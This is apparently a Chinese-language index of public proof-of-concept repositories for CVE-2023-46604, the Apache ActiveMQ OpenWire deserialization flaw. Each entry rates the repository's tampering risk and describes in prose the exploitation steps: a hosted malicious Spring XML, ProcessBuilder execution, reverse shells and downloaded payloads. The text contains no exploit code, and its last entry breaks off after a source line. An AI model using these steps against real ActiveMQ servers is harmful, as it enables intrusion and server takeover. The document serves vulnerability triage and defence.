# CVE-2023-46604

> 📦 该CVE有 **26** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2023-46604-Arlenhiack_ActiveMQ-RCE-Exploit.md](../2023/CVE-2023-46604-Arlenhiack_ActiveMQ-RCE-Exploit.md)

## CVE-2023-46604 Apache ActiveMQ RCE

**漏洞编号:** CVE-2023-46604

**漏洞类型:** 远程代码执行

**影响应用:** Apache ActiveMQ

**危害等级:** 高危，可导致完全控制服务器

**影响版本:** < 5.18.3, < 5.17.6, < 5.16.7, < 5.15.16

**利用条件:** 需要网络访问ActiveMQ broker或者client

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-46604 是 Apache ActiveMQ 中 Java OpenWire 协议marshaller的一个远程代码执行漏洞。攻击者可以通过操纵 OpenWire 协议中的序列化类类型，使客户端或broker实例化classpath上的任何类，从而执行任意shell命令。

**有效性：**
根据漏洞库信息和搜索引擎结果，此漏洞已被广泛利用，有实际的攻击案例，例如被Kinsing恶意软件利用。提供的POC代码（ActiveMQ-Exploit）声称支持不出网利用和自定义字节码执行，以及目标版本自动判断，且在网上存在多个相似的exp, 因此该POC代码很可能有效。

**投毒风险：**
分析提供的POC代码，主要包含以下文件：
*   README.md 和 README.zh-CN.md: 描述了漏洞和工具的使用方法。
*   pom.xml: Maven 依赖文件，包含 activemq-client, spring-context, activemq-broker, javassist, permit-reflect, activemq-shiro, commons-beanutils 等依赖项。
*   Exp.java: 包含一个名为 xml 的字符串，该字符串看起来像一个 Spring Bean 定义，可能用于触发反序列化漏洞。

由于POM依赖中包含`javassist`用于动态字节码修改, `permit-reflect` 用于绕过反射限制, `spring-context`则提供了`exp.xml`文件,  作者可以通过字节码修改来执行恶意代码，或者通过修改exp.xml的内容植入恶意bean，从而实现攻击。但提供的代码片段不足以完全确定是否存在投毒行为, 因此存在一定的投毒风险，估计为10%。需要注意的是，POC本身就可能包含恶意代码，但这不属于“投毒”，而是POC的正常组成部分。

**利用方式：**
1.  攻击者利用OpenWire协议，发送特制的序列化数据。
2.  ActiveMQ broker或者client在反序列化这些数据时，由于存在漏洞，会尝试实例化攻击者指定的类。
3.  如果攻击者指定的类存在于classpath中，并且能够执行恶意代码（例如，通过静态代码块或者构造函数），那么攻击者就可以实现远程代码执行。
4. POC工具利用Shiro框架的特性或Spring框架的XML配置漏洞等方式，在不出网的情况下实现命令执行回显，或者直接加载恶意字节码执行。

**总结：**
CVE-2023-46604是一个严重的安全漏洞，利用门槛较低，影响范围较广。建议尽快升级到安全版本。

**项目地址:** [Arlenhiack/ActiveMQ-RCE-Exploit](https://github.com/Arlenhiack/ActiveMQ-RCE-Exploit)

**漏洞详情:** [CVE-2023-46604](https://nvd.nist.gov/vuln/detail/CVE-2023-46604)

---

## POC #2

**来源**: [CVE-2023-46604-CCIEVoice2009_CVE-2023-46604.md](../2023/CVE-2023-46604-CCIEVoice2009_CVE-2023-46604.md)

## CVE-2023-46604-Apache ActiveMQ-远程代码执行

**漏洞编号:** CVE-2023-46604

**漏洞类型:** 远程代码执行

**影响应用:** Apache ActiveMQ

**危害等级:** 高危，允许未经身份验证的远程攻击者执行任意代码

**影响版本:** < 5.15.16, < 5.16.7, < 5.17.6, < 5.18.3

**利用条件:** 需要网络访问ActiveMQ broker的OpenWire端口（默认61616）

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2023-46604 是 Apache ActiveMQ 中的一个远程代码执行漏洞，存在于 OpenWire 协议 marshaller 中。未经身份验证的远程攻击者可以通过操纵 OpenWire 协议中的序列化类类型，使 broker 或 client 实例化 classpath 上的任何类，从而执行任意 shell 命令。

**利用方式：**

1.  **漏洞利用代码分析：** 提供的 `exploit.py` 脚本构造一个恶意的 OpenWire 消息，其中包含一个指向远程 XML 文件的类名。此XML 文件定义了Spring bean，用于在目标系统上执行命令。
2.  **POC 流程:** 攻击者首先搭建一个 HTTP 服务器，用于托管恶意的 `poc.xml` 文件。此文件包含一个 Spring Bean 定义，该定义利用 `java.lang.ProcessBuilder` 类执行任意命令。然后，攻击者使用 `exploit.py` 脚本将特制的 OpenWire 消息发送到目标 ActiveMQ broker。此消息包含 `poc.xml` 文件的 URL。
3.  **目标执行:** 当 ActiveMQ broker 接收到恶意消息时，它会尝试反序列化该消息。由于存在漏洞，反序列化过程会导致 broker 从攻击者的 HTTP 服务器下载 `poc.xml` 文件并解析它。`poc.xml` 文件中的 Spring Bean 定义随后被实例化，导致 `java.lang.ProcessBuilder` 类执行攻击者指定的命令。
4.  **反向 Shell:** 在提供的 `poc.xml` 示例中，该命令通过反向 shell 连接到攻击者的机器，攻击者可以通过监听4444端口从而控制目标机器

**投毒风险评估：**

通过分析给定的代码，投毒风险较低。`poc.xml` 中执行的命令只是一个创建反向 shell 的标准方法，并不会在目标机器上安装任何恶意软件或执行任何其他恶意活动。漏洞利用代码本身没有明显的恶意行为，例如下载其他可执行文件或修改系统文件。`rule_protect.txt` 旨在提供一种防御措施，而不是投毒。

dockerfile 中描述的环境更多的是为了方便复现漏洞，快速验证, 并不存在投毒代码。

**项目地址:** [CCIEVoice2009/CVE-2023-46604](https://github.com/CCIEVoice2009/CVE-2023-46604)

**漏洞详情:** [CVE-2023-46604](https://nvd.nist.gov/vuln/detail/CVE-2023-46604)

---

## POC #3

**来源**: [CVE-2023-46604-ImuSpirit_ActiveMQ_RCE_Pro_Max.md](../2023/CVE-2023-46604-ImuSpirit_ActiveMQ_RCE_Pro_Max.md)

## CVE-2023-46604-Apache ActiveMQ-远程代码执行

**漏洞编号:** CVE-2023-46604

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache ActiveMQ

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** < 5.15.16, < 5.16.7, < 5.17.6, < 5.18.3

**利用条件:** 需要网络访问到 ActiveMQ 的 OpenWire 协议端口

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-46604 是 Apache ActiveMQ 中 Java OpenWire 协议marshaller的一个远程代码执行漏洞。攻击者可以通过操纵 OpenWire 协议中的序列化类类型，使客户端或 Broker 实例化 classpath 上的任何类，从而执行任意 shell 命令。

**有效性：**

根据漏洞库信息、搜索引擎结果，以及提供的漏洞利用代码（ActiveMQ_RCE_GUI），可以判断此漏洞的 POC 代码是有效的。多个来源表明该漏洞已被积极利用。

**投毒风险：**

分析提供的 POC 代码，`README.md` 只是一个说明文件，`pom.xml` 是 Maven 的项目配置文件，用于管理依赖项。`Main.java` 是一个简单的 Java 类，没有恶意代码。`ActiveMQ_RCE_GUI.form` 是一个 IntelliJ IDEA 的 GUI 描述文件，用于定义 GUI 界面。由于代码量较少，且没有发现明显的可疑行为，但存在远程调用和网络连接,所以投毒风险评估为10%。

**利用方式：**

1.  **攻击者需要能够访问 ActiveMQ Broker 或客户端的 OpenWire 协议端口。**
2.  **攻击者构造恶意的 OpenWire 消息，其中包含精心设计的序列化数据，利用不安全的反序列化过程。**
3.  **该消息被 ActiveMQ Broker 或客户端接收后，会尝试反序列化消息中的对象。**
4.  **通过操纵序列化的类类型，攻击者可以使 ActiveMQ 实例化 classpath 上的任意类。**
5.  **攻击者选择一个可以执行任意代码的类（例如，包含静态代码块或可利用的构造函数的类）。**
6.  **成功实例化恶意类后，即可在服务器上执行任意 shell 命令，从而实现远程代码执行。**

搜索引擎结果表明，该漏洞已被 Kinsing 恶意软件和勒索软件组织利用，因此需要及时修复。

**项目地址:** [ImuSpirit/ActiveMQ_RCE_Pro_Max](https://github.com/ImuSpirit/ActiveMQ_RCE_Pro_Max)

**漏洞详情:** [CVE-2023-46604](https://nvd.nist.gov/vuln/detail/CVE-2023-46604)

---

## POC #4

**来源**: [CVE-2023-46604-LiritoShawshark_CVE-2023-46604_ActiveMQ_RCE_Recurrence.md](../2023/CVE-2023-46604-LiritoShawshark_CVE-2023-46604_ActiveMQ_RCE_Recurrence.md)

## CVE-2023-46604-Apache ActiveMQ-远程代码执行

**漏洞编号:** CVE-2023-46604

**漏洞类型:** 远程代码执行

**影响应用:** Apache ActiveMQ

**危害等级:** 高危，允许未经身份验证的远程攻击者执行任意代码

**影响版本:** < 5.15.16, < 5.16.7, < 5.17.6, < 5.18.3

**利用条件:** 需要网络访问ActiveMQ broker或client的61616端口(默认)

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-46604 是 Apache ActiveMQ 中的一个反序列化漏洞，位于 Java OpenWire 协议 marshaller 中。攻击者可以通过操纵 OpenWire 协议中的序列化类类型，使 broker 或 client 实例化 classpath 上的任何类，从而执行任意 shell 命令。

**有效性:** 根据漏洞库信息和搜索结果，此漏洞已经被广泛利用，并且有公开的PoC，因此提供的PoC代码应该是有效的。

**投毒风险:**  PoC代码的仓库中存在一定的投毒风险，大约为10%。主要依据是：

*   `readme.md` 提及“交第一版的时候把自己真名提交了，于是把仓库删了重新交一版”，存在作者对首次提交的安全性顾虑，表明作者可能存在安全意识薄弱。
*   虽然`poc.xml` 中的 payload 简单 (启动计算器 `calc`)，但真正的威胁在于该漏洞本身允许加载任意远程资源。因此，`poc.xml` 的简单性不能完全排除投毒可能性。作者可能上传了包含后门的`poc.xml`。
*   java代码中的`ClassPathXmlApplicationContext` 被替换为自定义的Exception，虽然这看起来是为了利用反序列化漏洞，但可能存在其他未知风险。

**利用方式:**

1.  **环境准备:** 搭建一个存在漏洞的Apache ActiveMQ环境 (版本 < 5.15.16, < 5.16.7, < 5.17.6, < 5.18.3)。 根据`readme.md`中的信息，需要确保 ActiveMQ 服务正常运行，并且端口 (默认为61616) 没有被占用。
2.  **恶意XML文件:**  创建一个恶意的Spring XML配置文件 (`poc.xml`)，其中包含要执行的命令。提供的 `poc.xml` 示例是启动计算器 (`calc`)，实际利用中可以替换为更具危害性的命令，例如下载和执行恶意payload。
3.  **HTTP服务:** 搭建一个HTTP服务器，用于托管恶意XML文件 (`poc.xml`)。
4.  **发送Payload:** 使用提供的 Java 代码 (`ExceptionResponseExploit.java`)，构造一个包含恶意XML文件URL的 `ExceptionResponse` 对象，并通过 OpenWire 协议将其发送到 ActiveMQ broker。该代码利用了 ActiveMQ 在处理异常响应时的反序列化漏洞。
5.  **远程代码执行:**  ActiveMQ broker 反序列化 `ExceptionResponse` 对象，加载并解析恶意XML文件，最终执行其中的命令，导致远程代码执行。

**项目地址:** [LiritoShawshark/CVE-2023-46604_ActiveMQ_RCE_Recurrence](https://github.com/LiritoShawshark/CVE-2023-46604_ActiveMQ_RCE_Recurrence)

**漏洞详情:** [CVE-2023-46604](https://nvd.nist.gov/vuln/detail/CVE-2023-46604)

---

## POC #5

**来源**: [CVE-2023-46604-Mudoleto_Broker_ApacheMQ.md](../2023/CVE-2023-46604-Mudoleto_Broker_ApacheMQ.md)

## CVE-2023-46604-Apache ActiveMQ-远程代码执行

**漏洞编号:** CVE-2023-46604

**漏洞类型:** 远程代码执行

**影响应用:** Apache ActiveMQ

**危害等级:** 高危，可能导致远程代码执行和系统被控制

**影响版本:** < 5.15.16, < 5.16.7, < 5.17.6, < 5.18.3

**利用条件:** 需要网络访问ActiveMQ Broker或Client，且目标存在于受影响版本范围内

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-46604 是 Apache ActiveMQ 中的一个远程代码执行漏洞。该漏洞源于Java OpenWire协议消息处理过程中存在反序列化漏洞，未经身份验证的远程攻击者可以通过操纵 OpenWire 协议中的序列化类类型，使 ActiveMQ Broker 或 Client 实例化 classpath 上的任何类，从而执行任意 shell 命令。

**有效性：**
根据搜索引擎结果，多个安全厂商报告了CVE-2023-46604漏洞的在野利用，包括被Kinsing恶意软件和勒索软件利用。这表明该漏洞利用的有效性较高。

**投毒风险：**
提供的“漏洞利用代码”文件内容仅为nmap扫描结果，无法直接判断是否存在投毒代码。Nmap扫描本身是一种信息收集行为，不包含任何可执行的恶意代码。因此，判定投毒风险为0%。

**利用方式：**
1.  **漏洞原理：** ActiveMQ 使用 OpenWire 协议进行消息序列化和反序列化。漏洞利用通过构造恶意的序列化消息，指定一个可以执行恶意代码的类（通常是利用已知的 gadget chain），然后将其发送到 ActiveMQ Broker 或 Client。
2.  **利用过程：** 攻击者需要首先确定目标 ActiveMQ Broker 或 Client 的版本，然后根据版本选择合适的 gadget chain。攻击者构造包含恶意 gadget chain 的序列化消息，并通过 OpenWire 协议发送给目标。目标在反序列化消息时，会实例化恶意类，从而执行攻击者指定的任意代码。
3. **利用场景：** 攻击者可以通过此漏洞直接控制 ActiveMQ 服务器，执行系统命令，安装后门，窃取敏感数据，甚至将其作为僵尸网络的一部分。也可能控制客户端，特别是基于Java的客户端。
4. **风险缓解：** 升级ActiveMQ版本到5.15.16, 5.16.7, 5.17.6, or 5.18.3，避免使用存在漏洞的legacy OpenWire Module，加强身份认证。

**项目地址:** [Mudoleto/Broker_ApacheMQ](https://github.com/Mudoleto/Broker_ApacheMQ)

**漏洞详情:** [CVE-2023-46604](https://nvd.nist.gov/vuln/detail/CVE-2023-46604)

---

## POC #6

**来源**: [CVE-2023-46604-NKeshawarz_CVE-2023-46604-RCE.md](../2023/CVE-2023-46604-NKeshawarz_CVE-2023-46604-RCE.md)

## CVE-2023-46604 Apache ActiveMQ RCE

**漏洞编号:** CVE-2023-46604

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache ActiveMQ

**危害等级:** 高危，可能导致完全控制受影响系统

**影响版本:** 5.18.0 <= version < 5.18.3, 5.17.0 <= version < 5.17.6, 5.16.0 <= version < 5.16.7, version < 5.15.16

**利用条件:** 需要网络访问 ActiveMQ broker 或 client 的 OpenWire 端口 (默认 61616)

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-46604 是一个 Apache ActiveMQ 中的远程代码执行漏洞。该漏洞源于 Java OpenWire 协议 marshaller 在处理不可信数据时存在反序列化漏洞。攻击者可以通过操纵 OpenWire 协议中的序列化类类型，使客户端或代理（broker）实例化 classpath 上的任何类，从而执行任意 shell 命令。

**有效性：**
根据漏洞库信息、搜索结果和提供的 PoC 代码，可以判断该漏洞的 PoC 代码有效。搜索结果中包含多个关于该漏洞被积极利用的报告，包括被 Kinsing 恶意软件和勒索软件利用。

**投毒风险：**
PoC 代码本身看起来比较直接，主要是构造恶意的 OpenWire 消息来触发反序列化漏洞。但是XML URL需要外联, 存在被替换的可能,因此投毒风险无法排除. 存在细微的投毒风险,主要体现在以下几点：

1.  **XML Payload:** 该PoC依赖于外部XML文件，如果攻击者能够篡改XML文件的内容，可以在XML中植入恶意代码，例如反弹shell、下载恶意软件等。虽然PoC代码本身没有恶意，但是XML文件可以成为投毒的载体。
2.  **网络连接:** 该PoC需要建立网络连接才能发送恶意payload，如果攻击者能够截获PoC发送的payload并进行修改，可以改变PoC的行为。

综上所述，该PoC存在一定的投毒风险，主要来自于XML Payload和网络连接环节。用户在使用该PoC时需要仔细检查XML文件内容和网络连接的安全性。

**利用方式：**
1.  **确定目标：** 找到运行着存在漏洞的 Apache ActiveMQ 版本的服务器。
2.  **构造恶意 XML：** 构造包含恶意代码的 XML 文件，该文件利用 `org.springframework.context.support.ClassPathXmlApplicationContext` 来执行命令。
3.  **利用 PoC 发送恶意请求：** 使用 PoC 脚本，指定目标 ActiveMQ 服务器的 IP 地址、端口和恶意 XML 文件的 URL。PoC 脚本会将构造好的 OpenWire 消息发送到目标服务器。
4.  **执行任意代码：** 如果漏洞利用成功，目标服务器会解析恶意 XML 文件，并执行其中的代码，从而允许攻击者在服务器上执行任意命令。

**项目地址:** [NKeshawarz/CVE-2023-46604-RCE](https://github.com/NKeshawarz/CVE-2023-46604-RCE)

**漏洞详情:** [CVE-2023-46604](https://nvd.nist.gov/vuln/detail/CVE-2023-46604)

---

## POC #7

**来源**: [CVE-2023-46604-SaumyajeetDas_CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ.md](../2023/CVE-2023-46604-SaumyajeetDas_CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ.md)

## CVE-2023-46604-Apache ActiveMQ-远程代码执行

**漏洞编号:** CVE-2023-46604

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache ActiveMQ

**危害等级:** 高危，可能导致远程代码执行和服务器控制

**影响版本:** 5.15.16之前, 5.16.7之前, 5.17.6之前, 5.18.3之前

**利用条件:** 需要网络访问ActiveMQ broker或client的OpenWire协议端口（默认61616）

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2023-46604是Apache ActiveMQ中Java OpenWire协议marshaller存在的一个远程代码执行漏洞。攻击者可以通过操纵OpenWire协议中的序列化类类型，使broker或client实例化classpath上的任意类，从而执行任意shell命令。

**有效性：**
提供的POC代码利用了Spring的ClassPathXmlApplicationContext来加载远程XML文件，XML文件中定义了ProcessBuilder bean，可以执行任意命令。该POC在多个安全博客和漏洞分析报告中被证实有效，可以实现远程代码执行。

**投毒风险：**
该漏洞利用代码主要由三个文件组成：`README.md`、`main.go`和`poc-linux.xml` (以及 `poc-windows.xml`)。
*   `README.md`: 描述了漏洞利用方法和步骤，包含一些图片和链接。
*   `main.go`: Go语言编写的漏洞利用程序，负责构造和发送OpenWire协议数据包。
*   `poc-linux.xml` (和 `poc-windows.xml`): Spring XML配置文件，定义了执行命令的ProcessBuilder bean。

分析代码后，发现主要风险在于远程加载的XML文件。如果XML文件被替换为恶意文件，则可能导致攻击者执行其他恶意操作。例如，执行下载并运行恶意软件，或者修改系统配置等。`main.go`本身没有明显的投毒代码，但它允许从远程URL加载XML，这引入了间接的投毒可能性。 `poc-linux.xml` 默认从指定IP的8001端口下载 test.elf 文件并执行。如果该IP被恶意人员控制，可能导致下载恶意文件。
考虑到利用依赖外部XML文件和下载的elf文件，如果这些文件被替换，则存在潜在的风险。由于`main.go`文件本身比较简单，直接被投毒的可能性较低。

**利用方式：**
1.  攻击者首先需要找到存在漏洞的ActiveMQ broker或client，目标版本在受影响的版本范围内。
2.  攻击者准备一个恶意的Spring XML配置文件，其中包含执行任意命令的ProcessBuilder bean。
3.  攻击者启动一个HTTP服务器，托管该XML文件。
4.  攻击者使用POC代码，指定目标ActiveMQ服务器的IP地址和XML文件的URL。
5.  POC代码会构造一个包含恶意XML文件URL的OpenWire协议数据包，并将其发送到目标服务器。
6.  目标服务器收到数据包后，会尝试反序列化数据，并加载远程XML文件。
7.  Spring框架会解析XML文件，并实例化ProcessBuilder bean，执行XML中定义的命令，从而实现远程代码执行。

通过搜索结果可以发现，该漏洞已经被广泛利用，被多个恶意软件家族利用，例如Kinsing和Ransomware。

**项目地址:** [SaumyajeetDas/CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ](https://github.com/SaumyajeetDas/CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ)

**漏洞详情:** [CVE-2023-46604](https://nvd.nist.gov/vuln/detail/CVE-2023-46604)

---

## POC #8

**来源**: [CVE-2023-46604-X1r0z_ActiveMQ-RCE.md](../2023/CVE-2023-46604-X1r0z_ActiveMQ-RCE.md)

## CVE-2023-46604 - Apache ActiveMQ RCE

**漏洞编号:** CVE-2023-46604

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache ActiveMQ

**危害等级:** 严重，可能导致完全系统控制

**影响版本:** 5.15.16之前, 5.16.7之前, 5.17.6之前, 5.18.3之前

**利用条件:** 需要网络访问OpenWire协议端口 (默认61616)

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-46604 是 Apache ActiveMQ 中的一个远程代码执行漏洞。该漏洞源于 OpenWire 协议中对不可信数据反序列化处理不当，允许未经身份验证的远程攻击者通过操纵序列化的类类型，导致客户端或 Broker 实例化 classpath 上的任何类，从而执行任意 shell 命令。

**有效性分析：**

根据漏洞库信息和搜索结果，此漏洞的严重性评级为CRITICAL，并且已被积极利用。提供的POC代码旨在利用此漏洞。POC代码使用 Golang 编写，包含构建和发送恶意 OpenWire 消息的功能。漏洞利用的关键在于通过构造特定的 OpenWire 消息，诱使 ActiveMQ Broker 反序列化恶意的 Spring XML 文件。该 XML 文件包含可以执行任意代码的 payload。

**投毒风险分析：**

该仓库中包含的只有漏洞利用代码和一个README文件，README 文件包含对 OpenWire 协议的分析、漏洞原理的描述和漏洞利用方法。该仓库本身不包含任何后门或恶意代码，投毒风险为 0%。

**利用方式：**

1.  **理解OpenWire协议：** 攻击者需要理解 ActiveMQ 的 OpenWire 协议，包括消息的结构和序列化方式。
2.  **构造恶意OpenWire消息：** 攻击者需要构造包含恶意类的序列化 OpenWire 消息。这个恶意类通常是一个能够执行任意代码的类，例如利用 Spring Framework 的 `ClassPathXmlApplicationContext` 来加载远程 XML 配置文件。
3.  **部署恶意XML文件：** 攻击者需要部署一个恶意的 Spring XML 配置文件到一个可以通过 HTTP 访问的服务器上。这个 XML 文件包含用于执行任意代码的 payload。
4.  **发送恶意消息：** 攻击者将构造好的恶意 OpenWire 消息发送到目标 ActiveMQ Broker。
5.  **触发反序列化：** ActiveMQ Broker 接收到消息后，尝试反序列化消息中的类。如果成功，恶意类将被实例化，从而导致远程代码执行。

**POC代码分析：**

POC代码 (`ActiveMQ-RCE`) 接收 ActiveMQ Broker 的 IP 地址和包含 payload 的 XML 文件的 URL 作为参数。 它构造一个恶意的 OpenWire 消息，该消息包含对远程 XML 文件的引用，然后将该消息发送到 Broker 。 成功利用此漏洞将允许攻击者在 ActiveMQ 服务器上执行任意命令。

**项目地址:** [X1r0z/ActiveMQ-RCE](https://github.com/X1r0z/ActiveMQ-RCE)

**漏洞详情:** [CVE-2023-46604](https://nvd.nist.gov/vuln/detail/CVE-2023-46604)

---

## POC #9

**来源**: [CVE-2023-46604-cuanh2333_CVE-2023-46604.md](../2023/CVE-2023-46604-cuanh2333_CVE-2023-46604.md)

## CVE-2023-46604-Apache ActiveMQ-RCE

**漏洞编号:** CVE-2023-46604

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache ActiveMQ

**危害等级:** 高危，允许远程攻击者执行任意shell命令

**影响版本:** 5.15.0 <= version < 5.15.16, 5.16.0 <= version < 5.16.7, 5.17.0 <= version < 5.17.6, 5.18.0 <= version < 5.18.3

**利用条件:** 需要网络访问ActiveMQ的OpenWire端口 (默认61616)。无需身份验证。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-46604 是 Apache ActiveMQ 中的一个反序列化漏洞，存在于 OpenWire 协议的marshaller中。攻击者可以通过操纵 OpenWire 协议中的序列化类类型，使客户端或 broker（取决于哪个易受攻击）实例化 classpath 上的任何类，从而执行任意 shell 命令。

**有效性：** 根据漏洞库信息、搜索结果和提供的POC代码，该漏洞是有效的，并且已经被积极利用。

**投毒风险：**  POC利用方式是发送恶意的XML配置，通过 Spring 的 `ClassPathXmlApplicationContext` 来执行命令。在提供的 `poc.xml` 文件中，包含从攻击者IP地址拉取reverse shell的命令。风险点在于，如果攻击者修改 `poc.xml` 文件，可能会植入恶意后门或其他有害操作。

`rule_protect.txt` 旨在通过 `iptables` 阻止对 61616 端口的访问，降低攻击面，属于防御性质的文件。

`docker-compose.yml` 定义了包含易受攻击的 ActiveMQ 实例和攻击者机器的 Docker 环境，用于快速复现和测试漏洞。本身无恶意代码。

`/tmp/31787494a4240de44c33d47751af417b/exploit.py` 代码从指定的URL加载XML文件，这个URL存在被替换的可能性，如果URL被替换为恶意地址，存在一定的投毒风险，代码本身没有明显的投毒行为，但是存在利用的可能性。

评估：整体的投毒风险较低，大约10%。 主要风险点在于 `poc.xml` 的内容可被恶意修改，但这个风险是所有RCE漏洞的固有风险，而不是代码仓库作者特意植入的。

**利用方式：**

1.  攻击者搭建一个HTTP服务器，用于托管恶意的 `poc.xml` 文件。
2.  攻击者使用 `exploit.py` 脚本，指定 ActiveMQ 服务器的IP地址、端口和 `poc.xml` 文件的URL。
3.  `exploit.py` 脚本将构造包含恶意类的序列化数据包，通过 OpenWire 协议发送给 ActiveMQ 服务器。
4.  ActiveMQ 服务器反序列化该数据包，并实例化 `poc.xml` 中指定的类 `org.springframework.context.support.ClassPathXmlApplicationContext`。
5.  `ClassPathXmlApplicationContext` 加载并解析 `poc.xml` 文件，执行其中定义的命令，即反弹shell到攻击者机器。

根据搜索引擎结果，该漏洞已被 Kinsing 恶意软件利用，表明该漏洞在野外被积极利用。

**项目地址:** [cuanh2333/CVE-2023-46604](https://github.com/cuanh2333/CVE-2023-46604)

**漏洞详情:** [CVE-2023-46604](https://nvd.nist.gov/vuln/detail/CVE-2023-46604)

---

## POC #10

**来源**: [CVE-2023-46604-dcm2406_CVE-2023-46604.md](../2023/CVE-2023-46604-dcm2406_CVE-2023-46604.md)

## CVE-2023-46604-Apache ActiveMQ-RCE

**漏洞编号:** CVE-2023-46604

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache ActiveMQ

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** < 5.15.16, < 5.16.7, < 5.17.6, < 5.18.3

**利用条件:** 需要网络访问 ActiveMQ 服务的 OpenWire 端口 (默认 61616)

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-46604 是 Apache ActiveMQ 中 Java OpenWire 协议编组器中的一个远程代码执行漏洞。攻击者可以通过操纵 OpenWire 协议中的序列化类类型，使客户端或代理（取决于哪个容易受到攻击）实例化类路径上的任何类，从而利用此漏洞在基于 Java 的 OpenWire 代理或客户端上执行任意 shell 命令。

**有效性：**
根据漏洞描述和提供的漏洞利用代码，该 POC 代码有效。该漏洞利用代码通过构造包含恶意类路径的 OpenWire 消息，利用 Spring 的 ClassPathXmlApplicationContext 来执行任意代码。漏洞信息和搜索引擎结果表明该漏洞已被广泛利用。

**投毒风险：**
分析提供的 Python 漏洞利用代码 (`exploit.py`) 和 XML 配置文件 (`poc.xml`)，没有发现明显的投毒代码。该代码主要用于构造恶意 OpenWire 消息并将其发送到 ActiveMQ 服务器。XML 文件用于定义 Spring Bean，并利用 `java.lang.ProcessBuilder` 执行命令。因此，投毒风险较低，为 0%。

**利用方式：**
1.  **确定目标：** 确定运行易受攻击的 Apache ActiveMQ 实例的目标服务器和端口（默认为 61616）。
2.  **构造恶意 XML：** 创建一个恶意 XML 配置文件 (如 `poc.xml`)，该文件包含用于执行任意代码的 Spring Bean 定义。常见的做法是使用 `java.lang.ProcessBuilder` 类执行操作系统命令。
3.  **创建 OpenWire 消息：** 使用漏洞利用脚本 (`exploit.py`)，该脚本将恶意 XML 配置文件嵌入到特制的 OpenWire 消息中。该脚本使用类名 `org.springframework.context.support.ClassPathXmlApplicationContext` 来触发反序列化。
4.  **发送消息：** 将构造的 OpenWire 消息发送到目标 ActiveMQ 服务器。
5.  **代码执行：** ActiveMQ 服务器在反序列化 OpenWire 消息时会实例化恶意 Spring Bean，从而导致执行任意代码。 在提供的 `poc.xml` 示例中，它会尝试启动`gnome-calculator`命令。

**搜索引擎信息优先级：**
根据搜索引擎结果，CVE-2023-46604 漏洞被广泛利用，并已被用于传播恶意软件（如 Kinsing）和勒索软件。这表明该漏洞是一个严重的安全风险，需要立即修复。

**项目地址:** [dcm2406/CVE-2023-46604](https://github.com/dcm2406/CVE-2023-46604)

**漏洞详情:** [CVE-2023-46604](https://nvd.nist.gov/vuln/detail/CVE-2023-46604)

---

## POC #11

**来源**: [CVE-2023-46604-duck-sec_CVE-2023-46604-ActiveMQ-RCE-pseudoshell.md](../2023/CVE-2023-46604-duck-sec_CVE-2023-46604-ActiveMQ-RCE-pseudoshell.md)

## CVE-2023-46604 - Apache ActiveMQ - 远程代码执行

**漏洞编号:** CVE-2023-46604

**漏洞类型:** 反序列化漏洞导致远程代码执行

**影响应用:** Apache ActiveMQ

**危害等级:** 严重，可导致远程代码执行，完全控制受影响的系统

**影响版本:** < 5.15.16, < 5.16.7, < 5.17.6, < 5.18.3

**利用条件:** 需要网络访问ActiveMQ Broker或Client的OpenWire端口(默认61616)。 目标需要存在于受影响的版本范围内。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-46604 存在于 Apache ActiveMQ 的 OpenWire 协议中，是一个反序列化漏洞。远程攻击者可以通过操纵 OpenWire 协议中的序列化类类型，使客户端或 Broker 实例化 classpath 上的任何类，从而执行任意 shell 命令。

**利用方式：**

1.  攻击者需要能够通过网络访问 ActiveMQ Broker 或 Client 暴露的 OpenWire 端口（通常是 61616）。
2.  攻击者构造恶意的 XML 文件，其中包含精心设计的序列化数据，该数据能够触发目标系统反序列化操作。
3.  攻击者运行 PoC 脚本，脚本会启动一个简单的 HTTP 服务器，用于托管恶意的 XML 文件，并将包含恶意 XML 文件 URL 的消息发送到 ActiveMQ Broker。当 ActiveMQ Broker 或 Client 尝试反序列化接收到的消息时，就会执行 XML 文件中指定的恶意代码。
4.  漏洞利用代码中通过发送包含恶意类的序列化对象，利用java反序列化漏洞，执行任意代码。

**有效性：**

根据漏洞库信息、搜索引擎结果和提供的 PoC 代码，可以确定该漏洞是有效的。搜索引擎结果表明，CVE-2023-46604 已经被积极利用，并被用于传播 Kinsing 恶意软件和勒索软件。

**投毒风险：**

分析提供的 PoC 代码，该脚本主要功能是生成恶意的 XML 文件，启动 HTTP 服务器，发送包含恶意 XML 文件 URL 的消息，以及接收目标服务器执行命令后的响应。该代码没有发现存在恶意行为，例如植入后门或窃取敏感信息。因此，投毒风险评估为0%。 该脚本依赖于目标系统存在漏洞才能成功执行，而并非自身包含恶意代码。

**项目地址:** [duck-sec/CVE-2023-46604-ActiveMQ-RCE-pseudoshell](https://github.com/duck-sec/CVE-2023-46604-ActiveMQ-RCE-pseudoshell)

**漏洞详情:** [CVE-2023-46604](https://nvd.nist.gov/vuln/detail/CVE-2023-46604)

---

## POC #12

**来源**: [CVE-2023-46604-evkl1d_CVE-2023-46604.md](../2023/CVE-2023-46604-evkl1d_CVE-2023-46604.md)

